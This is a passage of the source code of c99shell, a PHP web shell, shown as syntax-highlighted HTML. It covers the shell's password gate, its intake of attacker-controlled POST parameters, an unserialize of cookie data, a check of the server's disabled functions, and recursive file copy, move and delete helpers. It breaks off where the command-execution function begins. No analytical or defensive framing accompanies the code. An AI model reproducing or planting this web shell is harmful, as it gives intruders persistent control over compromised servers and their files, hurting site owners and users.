 <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$md5_pass</span><span class="p">))</span> <span class="p">{</span><span class="nv">$md5_pass</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);}</span>
 <span class="k">if</span> <span class="p">((</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_USER&quot;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$login</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;PHP_AUTH_PW&quot;</span><span class="p">])</span> <span class="o">!=</span> <span class="nv">$md5_pass</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$login_txt</span><span class="p">))</span> <span class="p">{</span><span class="nv">$login_txt</span> <span class="o">=</span> <span class="nb">strip_tags</span><span class="p">(</span><span class="nb">ereg_replace</span><span class="p">(</span><span class="s2">&quot;&amp;nbsp;|&amp;lt;br&amp;gt;&quot;</span><span class="p">,</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$donated_html</span><span class="p">));}</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;WWW-Authenticate: Basic realm=</span><span class="se">\&quot;</span><span class="s2">c99shell &quot;</span><span class="o">.</span><span class="nv">$shver</span><span class="o">.</span><span class="s2">&quot;: &quot;</span><span class="o">.</span><span class="nv">$login_txt</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;HTTP/1.0 401 Unauthorized&quot;</span><span class="p">);</span>
  <span class="k">exit</span><span class="p">(</span><span class="nv">$accessdeniedmess</span><span class="p">);</span>
 <span class="p">}</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">]))</span> <span class="nv">$act</span>  <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;act&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">]))</span> <span class="nv">$d</span>    <span class="o">=</span> <span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;d&#39;</span><span class="p">]);</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">]))</span> <span class="nv">$sort</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sort&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">]))</span> <span class="nv">$f</span>    <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;f&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ft&#39;</span><span class="p">]))</span> <span class="nv">$ft</span>   <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;ft&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;grep&#39;</span><span class="p">]))</span> <span class="nv">$grep</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;grep&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;processes_sort&#39;</span><span class="p">]))</span> <span class="nv">$processes_sort</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;processes_sort&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pid&#39;</span><span class="p">]))</span> <span class="nv">$pid</span>  <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pid&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sig&#39;</span><span class="p">]))</span> <span class="nv">$sig</span>  <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;sig&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">]))</span> <span class="nv">$base64</span>  <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;base64&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fullhexdump&#39;</span><span class="p">]))</span> <span class="nv">$fullhexdump</span>  <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fullhexdump&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]))</span> <span class="nv">$c</span>  <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;white&#39;</span><span class="p">]))</span> <span class="nv">$white</span>  <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;white&#39;</span><span class="p">];</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nixpasswd&#39;</span><span class="p">]))</span> <span class="nv">$nixpasswd</span>  <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nixpasswd&#39;</span><span class="p">];</span>

<span class="nv">$lastdir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);</span>
<span class="nb">chdir</span><span class="p">(</span><span class="nv">$curdir</span><span class="p">);</span>
<span class="nv">$sess_data</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&quot;</span><span class="si">$sess_cookie</span><span class="s2">&quot;</span><span class="p">]);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sess_data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>

<span class="nv">$disablefunc</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;disable_functions&quot;</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$disablefunc</span><span class="p">))</span>
<span class="p">{</span>
 <span class="nv">$disablefunc</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">);</span>
 <span class="nv">$disablefunc</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;c99_buff_prepare&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">c99_buff_prepare</span><span class="p">()</span>
<span class="p">{</span>
 <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">;</span>
 <span class="k">global</span> <span class="nv">$act</span><span class="p">;</span>
 <span class="k">foreach</span><span class="p">(</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">,DIRECTORY_SEPARATOR,realpath(</span><span class="si">$v</span><span class="s2">));}</span>
<span class="s2"> foreach(</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">) </span><span class="si">{</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">][</span><span class="nv">$k</span><span class="p">]</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">,DIRECTORY_SEPARATOR,realpath(</span><span class="si">$v</span><span class="s2">));</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> </span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2"> = array_unique(</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2">);</span>
<span class="s2"> </span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2"> = array_unique(</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2">);</span>
<span class="s2"> sort(</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2">);</span>
<span class="s2"> sort(</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2">);</span>
<span class="s2"> if (</span><span class="si">$act</span><span class="s2"> != &quot;</span><span class="nb">copy</span><span class="s2">&quot;) {foreach(</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">) {if (</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2">[</span><span class="si">$k</span><span class="s2">] == </span><span class="si">$v</span><span class="s2">) {unset(</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2">[</span><span class="si">$k</span><span class="s2">]); }}}</span>
<span class="s2"> else {foreach(</span><span class="si">$sess_data[&quot;copy&quot;]</span><span class="s2"> as </span><span class="si">$k</span><span class="s2">=&amp;gt;</span><span class="si">$v</span><span class="s2">) {if (</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2">[</span><span class="si">$k</span><span class="s2">] == </span><span class="si">$v</span><span class="s2">) {unset(</span><span class="si">$sess_data[&quot;cut&quot;]</span><span class="s2">[</span><span class="si">$k</span><span class="s2">]);}}}</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">c99_buff_prepare();</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">c99_sess_put</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function c99_sess_put(</span><span class="si">$data</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> global </span><span class="si">$sess_cookie</span><span class="s2">;</span>
<span class="s2"> global </span><span class="si">$sess_data</span><span class="s2">;</span>
<span class="s2"> c99_buff_prepare();</span>
<span class="s2"> </span><span class="si">$sess_data</span><span class="s2"> = </span><span class="si">$data</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$data</span><span class="s2"> = serialize(</span><span class="si">$data</span><span class="s2">);</span>
<span class="s2"> setcookie(</span><span class="si">$sess_cookie</span><span class="s2">,</span><span class="si">$data</span><span class="s2">);</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">foreach (array(&quot;</span><span class="nb">sort</span><span class="s2">&quot;,&quot;</span><span class="nx">sql_sort</span><span class="s2">&quot;) as </span><span class="si">$v</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> if (!empty(</span><span class="si">$_POST[$v]</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$$v</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">];</span><span class="si">}</span><span class="s2"></span>
<span class="s2">}</span>
<span class="s2">if (</span><span class="si">$sort_save</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> if (!empty(</span><span class="si">$sort</span><span class="s2">)) {setcookie(&quot;</span><span class="nb">sort</span><span class="s2">&quot;,</span><span class="si">$sort</span><span class="s2">);}</span>
<span class="s2"> if (!empty(</span><span class="si">$sql_sort</span><span class="s2">)) {setcookie(&quot;</span><span class="nx">sql_sort</span><span class="s2">&quot;,</span><span class="si">$sql_sort</span><span class="s2">);}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">str2mini</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function str2mini(</span><span class="si">$content</span><span class="s2">,</span><span class="si">$len</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> if (strlen(</span><span class="si">$content</span><span class="s2">) &amp;gt; </span><span class="si">$len</span><span class="s2">)</span>
<span class="s2"> {</span>
<span class="s2">  </span><span class="si">$len</span><span class="s2"> = ceil(</span><span class="si">$len</span><span class="s2">/2) - 2;</span>
<span class="s2">  return substr(</span><span class="si">$content</span><span class="s2">, 0,</span><span class="si">$len</span><span class="s2">).&quot;</span><span class="o">...</span><span class="s2">&quot;.substr(</span><span class="si">$content</span><span class="s2">,-</span><span class="si">$len</span><span class="s2">);</span>
<span class="s2"> }</span>
<span class="s2"> else {return </span><span class="si">$content</span><span class="s2">;}</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">view_size</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function view_size(</span><span class="si">$size</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> if (!is_numeric(</span><span class="si">$size</span><span class="s2">)) {return FALSE;}</span>
<span class="s2"> else</span>
<span class="s2"> {</span>
<span class="s2">  if (</span><span class="si">$size</span><span class="s2"> &amp;gt;= 1073741824) </span><span class="si">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1073741824</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; GB&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  elseif (</span><span class="si">$size</span><span class="s2"> &amp;gt;= 1048576) </span><span class="si">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1048576</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; MB&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  elseif (</span><span class="si">$size</span><span class="s2"> &amp;gt;= 1024) </span><span class="si">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1024</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; KB&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  else </span><span class="si">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nv">$size</span> <span class="o">.</span> <span class="s2">&quot; B&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  return </span><span class="si">$size</span><span class="s2">;</span>
<span class="s2"> }</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">fs_copy_dir</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function fs_copy_dir(</span><span class="si">$d</span><span class="s2">,</span><span class="si">$t</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$d</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\</span><span class="s2">&quot;,DIRECTORY_SEPARATOR,</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2"> if (substr(</span><span class="si">$d</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2"> </span><span class="si">$h</span><span class="s2"> = opendir(</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2"> while ((</span><span class="si">$o</span><span class="s2"> = readdir(</span><span class="si">$h</span><span class="s2">)) !== FALSE)</span>
<span class="s2"> {</span>
<span class="s2">  if ((</span><span class="si">$o</span><span class="s2"> != &quot;</span><span class="o">.</span><span class="s2">&quot;) and (</span><span class="si">$o</span><span class="s2"> != &quot;</span><span class="o">..</span><span class="s2">&quot;))</span>
<span class="s2">  {</span>
<span class="s2">   if (!is_dir(</span><span class="si">$d</span><span class="s2">.DIRECTORY_SEPARATOR.</span><span class="si">$o</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   else </span><span class="si">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   if (!</span><span class="si">$ret</span><span class="s2">) {return </span><span class="si">$ret</span><span class="s2">;}</span>
<span class="s2">  }</span>
<span class="s2"> }</span>
<span class="s2"> closedir(</span><span class="si">$h</span><span class="s2">);</span>
<span class="s2"> return TRUE;</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">fs_copy_obj</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function fs_copy_obj(</span><span class="si">$d</span><span class="s2">,</span><span class="si">$t</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$d</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\</span><span class="s2">&quot;,DIRECTORY_SEPARATOR,</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2"> </span><span class="si">$t</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\</span><span class="s2">&quot;,DIRECTORY_SEPARATOR,</span><span class="si">$t</span><span class="s2">);</span>
<span class="s2"> if (!is_dir(dirname(</span><span class="si">$t</span><span class="s2">))) {mkdir(dirname(</span><span class="si">$t</span><span class="s2">));}</span>
<span class="s2"> if (is_dir(</span><span class="si">$d</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2">  if (substr(</span><span class="si">$d</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  if (substr(</span><span class="si">$t</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  return fs_copy_dir(</span><span class="si">$d</span><span class="s2">,</span><span class="si">$t</span><span class="s2">);</span>
<span class="s2"> }</span>
<span class="s2"> elseif (is_file(</span><span class="si">$d</span><span class="s2">)) {return copy(</span><span class="si">$d</span><span class="s2">,</span><span class="si">$t</span><span class="s2">);}</span>
<span class="s2"> else {return FALSE;}</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">fs_move_dir</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function fs_move_dir(</span><span class="si">$d</span><span class="s2">,</span><span class="si">$t</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$h</span><span class="s2"> = opendir(</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2"> if (!is_dir(</span><span class="si">$t</span><span class="s2">)) {mkdir(</span><span class="si">$t</span><span class="s2">);}</span>
<span class="s2"> while ((</span><span class="si">$o</span><span class="s2"> = readdir(</span><span class="si">$h</span><span class="s2">)) !== FALSE)</span>
<span class="s2"> {</span>
<span class="s2">  if ((</span><span class="si">$o</span><span class="s2"> != &quot;</span><span class="o">.</span><span class="s2">&quot;) and (</span><span class="si">$o</span><span class="s2"> != &quot;</span><span class="o">..</span><span class="s2">&quot;))</span>
<span class="s2">  {</span>
<span class="s2">   </span><span class="si">$ret</span><span class="s2"> = TRUE;</span>
<span class="s2">   if (!is_dir(</span><span class="si">$d</span><span class="s2">.DIRECTORY_SEPARATOR.</span><span class="si">$o</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);</span><span class="si">}</span><span class="s2"></span>
<span class="s2">   else {if (mkdir(</span><span class="si">$t</span><span class="s2">.DIRECTORY_SEPARATOR.</span><span class="si">$o</span><span class="s2">) and fs_copy_dir(</span><span class="si">$d</span><span class="s2">.DIRECTORY_SEPARATOR.</span><span class="si">$o</span><span class="s2">,</span><span class="si">$t</span><span class="s2">.DIRECTORY_SEPARATOR.</span><span class="si">$o</span><span class="s2">)) </span><span class="si">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;</span><span class="si">}</span><span class="s2">}</span>
<span class="s2">   if (!</span><span class="si">$ret</span><span class="s2">) {return </span><span class="si">$ret</span><span class="s2">;}</span>
<span class="s2">  }</span>
<span class="s2"> }</span>
<span class="s2"> closedir(</span><span class="si">$h</span><span class="s2">);</span>
<span class="s2"> return TRUE;</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">fs_move_obj</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function fs_move_obj(</span><span class="si">$d</span><span class="s2">,</span><span class="si">$t</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$d</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\</span><span class="s2">&quot;,DIRECTORY_SEPARATOR,</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2"> </span><span class="si">$t</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\</span><span class="s2">&quot;,DIRECTORY_SEPARATOR,</span><span class="si">$t</span><span class="s2">);</span>
<span class="s2"> if (is_dir(</span><span class="si">$d</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2">  if (substr(</span><span class="si">$d</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  if (substr(</span><span class="si">$t</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  return fs_move_dir(</span><span class="si">$d</span><span class="s2">,</span><span class="si">$t</span><span class="s2">);</span>
<span class="s2"> }</span>
<span class="s2"> elseif (is_file(</span><span class="si">$d</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2">  if(copy(</span><span class="si">$d</span><span class="s2">,</span><span class="si">$t</span><span class="s2">)) {return unlink(</span><span class="si">$d</span><span class="s2">);}</span>
<span class="s2">  else {unlink(</span><span class="si">$t</span><span class="s2">); return FALSE;}</span>
<span class="s2"> }</span>
<span class="s2"> else {return FALSE;}</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">fs_rmdir</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function fs_rmdir(</span><span class="si">$d</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$h</span><span class="s2"> = opendir(</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2"> while ((</span><span class="si">$o</span><span class="s2"> = readdir(</span><span class="si">$h</span><span class="s2">)) !== FALSE)</span>
<span class="s2"> {</span>
<span class="s2">  if ((</span><span class="si">$o</span><span class="s2"> != &quot;</span><span class="o">.</span><span class="s2">&quot;) and (</span><span class="si">$o</span><span class="s2"> != &quot;</span><span class="o">..</span><span class="s2">&quot;))</span>
<span class="s2">  {</span>
<span class="s2">   if (!is_dir(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$o</span><span class="s2">)) {unlink(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$o</span><span class="s2">);}</span>
<span class="s2">   else {fs_rmdir(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$o</span><span class="s2">.DIRECTORY_SEPARATOR); rmdir(</span><span class="si">$d</span><span class="s2">.</span><span class="si">$o</span><span class="s2">);}</span>
<span class="s2">  }</span>
<span class="s2"> }</span>
<span class="s2"> closedir(</span><span class="si">$h</span><span class="s2">);</span>
<span class="s2"> rmdir(</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2"> return !is_dir(</span><span class="si">$d</span><span class="s2">);</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">fs_rmobj</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function fs_rmobj(</span><span class="si">$o</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> </span><span class="si">$o</span><span class="s2"> = str_replace(&quot;</span><span class="nx">\</span><span class="s2">&quot;,DIRECTORY_SEPARATOR,</span><span class="si">$o</span><span class="s2">);</span>
<span class="s2"> if (is_dir(</span><span class="si">$o</span><span class="s2">))</span>
<span class="s2"> {</span>
<span class="s2">  if (substr(</span><span class="si">$o</span><span class="s2">,-1) != DIRECTORY_SEPARATOR) </span><span class="si">{</span><span class="nv">$o</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="s2">  return fs_rmdir(</span><span class="si">$o</span><span class="s2">);</span>
<span class="s2"> }</span>
<span class="s2"> elseif (is_file(</span><span class="si">$o</span><span class="s2">)) {return unlink(</span><span class="si">$o</span><span class="s2">);}</span>
<span class="s2"> else {return FALSE;}</span>
<span class="s2">}</span>
<span class="s2">}</span>
<span class="s2">if (!function_exists(&quot;</span><span class="nx">myshellexec</span><span class="s2">&quot;))</span>
<span class="s2">{</span>
<span class="s2">function myshellexec(</span><span class="si">$cmd</span><span class="s2">)</span>
<span class="s2">{</span>
<span class="s2"> global </span><span class="si">$disablefunc</span><span class="s2">;</span>
<span class="s2"> </span><span class="si">$result</span><span class="s2"> = &quot;&quot;;</span>
<span class="s2"> if (!empty(</span><span class="si">$cmd</span><span class="s2">))</span>
<span class="s2"> {</span>
